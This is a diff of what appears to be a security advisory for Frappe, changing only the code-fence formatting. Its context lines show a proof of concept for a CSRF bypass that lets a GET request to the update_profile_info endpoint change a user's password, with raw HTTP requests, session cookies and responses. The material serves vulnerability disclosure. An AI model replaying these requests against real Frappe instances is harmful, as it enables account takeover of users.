@@ -229,7 +229,7 @@ profile_info={"new_password"%3a"0xdeadbeef"}
 ```
 
 **Response:**
-```
+```http
 HTTP/1.1 200 OK
 Server: nginx/1.22.1
 Date: Fri, 16 May 2025 09:11:03 GMT
@@ -249,7 +249,7 @@ cmd=login&usr=test@test.test&pwd=0xdeadbeef
 ```
 
 **Response:**
-```
+```http
 HTTP/1.1 200 OK
 Server: nginx/1.22.1
 Set-Cookie: sid=5fbcd629e3d859ba69acfd8718ae79d6dac5d40b2754dafa7f6e859a; Expires=Fri, 23 May 2025 11:14:03 GMT; Max-Age=612000; HttpOnly; Path=/; SameSite=Lax
@@ -262,7 +262,7 @@ This vulnerability could lead to a complete takeover of the user's account when 
 To abuse the CSRF bypass one have to first send POST request to change the password and then the password can be also changed by GET requests as follows.
 
 **Request:**
-```
+```http
 POST /api/method/frappe.desk.page.user_profile.user_profile.update_profile_info HTTP/1.1
 Host: localhost:8080
 Cookie: sid=a4c9818f005fa628d936b0937e0b8da3486167b11ff1ff9a87767ab7
@@ -274,7 +274,7 @@ profile_info={"new_password"%3a"0xdeadbeef"}
 ```
 
 **Response:**
-```
+```http
 HTTP/1.1 200 OK
 Server: nginx/1.22.1
 Date: Fri, 16 May 2025 09:28:44 GMT
@@ -284,14 +284,14 @@ Content-Type: application/json
 After this first POST request GET requests can also be used to change the password for some reason.
 
 **Request:**
-```
+```http
 GET /api/method/frappe.desk.page.user_profile.user_profile.update_profile_info?profile_info={"new_password"%3a"0xdeadbeef123"} HTTP/1.1
 Host: localhost:8080
 Cookie: sid=a4c9818f005fa628d936b0937e0b8da3486167b11ff1ff9a87767ab7
 ```
 
 **Response:**
-```
+```http
 HTTP/1.1 200 OK
 Server: nginx/1.22.1
 Date: Fri, 16 May 2025 09:32:12 GMT
@@ -302,7 +302,7 @@ Content-Length: 2044
 And after the password is changed user can login with the new credentials `0xdeadbeef123`.
 
 **Request:**
-```
+```http
 POST /login HTTP/1.1
 Host: localhost:8080
 X-Requested-With: XMLHttpRequest
@@ -313,7 +313,7 @@ cmd=login&usr=test1@test.test&pwd=0xdeadbeef123
 ```
 
 **Response:**
-```
+```http
 HTTP/1.1 200 OK
 Server: nginx/1.22.1
 Date: Fri, 16 May 2025 09:32:18 GMT
